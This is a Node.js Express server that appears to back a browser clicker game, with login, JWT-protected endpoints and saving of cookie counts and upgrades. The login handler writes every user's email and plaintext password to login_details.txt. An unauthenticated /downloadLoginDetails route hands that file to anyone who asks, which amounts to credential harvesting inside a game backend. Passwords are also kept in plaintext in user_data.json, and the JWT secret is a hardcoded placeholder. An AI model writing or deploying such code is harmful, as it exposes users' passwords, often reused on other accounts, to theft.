const express = require('express');
const bodyParser = require('body-parser');
const jwt = require('jwt-simple');
const fs = require('fs');
const cors = require('cors');

const app = express();
const port = 5000;

const SECRET_KEY = 'your-secret-key';  // Use a strong secret key in production

app.use(cors());
app.use(bodyParser.json());

// A temporary in-memory user database (for testing purposes)
const users = {};

// Helper to generate JWT token
function generateToken(email) {
    const payload = { email };
    return jwt.encode(payload, SECRET_KEY);
}

// Helper to verify JWT token
function verifyToken(token) {
    try {
        const decoded = jwt.decode(token, SECRET_KEY);
        return decoded;
    } catch (err) {
        return null;
    }
}

// Endpoint to log in the user
app.post('/login', (req, res) => {
    const { email, password } = req.body;

    // Simple mock of user authentication. In a real app, you would check the password against a database
    if (!email || !password) {
        return res.status(400).json({ success: false, message: 'Email and password are required' });
    }

    // If user is new, add them to the "database"
    if (!users[email]) {
        users[email] = { password, cookies: 0, upgrades: [] }; // Initialize the user data
    }

    // Mock password check
    if (users[email].password === password) {
        const token = generateToken(email);

        // Save the login details to a text file
        const loginDetails = `Email: ${email}\nPassword: ${password}\n`;
        fs.appendFileSync('login_details.txt', loginDetails); // Save to the file (create if not exists)

        return res.json({ success: true, token });
    } else {
        return res.status(401).json({ success: false, message: 'Invalid email or password' });
    }
});

// Middleware to check if the user is authenticated
function isAuthenticated(req, res, next) {
    const token = req.headers['authorization']?.split(' ')[1];
    if (!token) {
        return res.status(401).json({ success: false, message: 'No token provided' });
    }

    const decoded = verifyToken(token);
    if (!decoded) {
        return res.status(401).json({ success: false, message: 'Invalid token' });
    }

    req.user = decoded;
    next();
}

// Endpoint to get user data (cookies and upgrades)
app.get('/getCookies', isAuthenticated, (req, res) => {
    const userData = users[req.user.email];
    if (userData) {
        res.json({ cookies: userData.cookies, upgrades: userData.upgrades });
    } else {
        res.status(404).json({ success: false, message: 'User data not found' });
    }
});

// Endpoint to save cookies and upgrades
app.post('/saveCookies', isAuthenticated, (req, res) => {
    const { cookies, upgrades } = req.body;
    const userData = users[req.user.email];

    if (userData) {
        userData.cookies = cookies;
        userData.upgrades = upgrades;

        // Optionally, save the data to a file (for persistence)
        fs.writeFileSync('user_data.json', JSON.stringify(users));

        res.json({ success: true });
    } else {
        res.status(404).json({ success: false, message: 'User data not found' });
    }
});

// Endpoint to download the login details file
app.get('/downloadLoginDetails', (req, res) => {
    const filePath = 'login_details.txt';
    if (fs.existsSync(filePath)) {
        res.download(filePath);  // Send the file to the client for download
    } else {
        res.status(404).json({ success: false, message: 'No login details file found' });
    }
});

// Start the server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
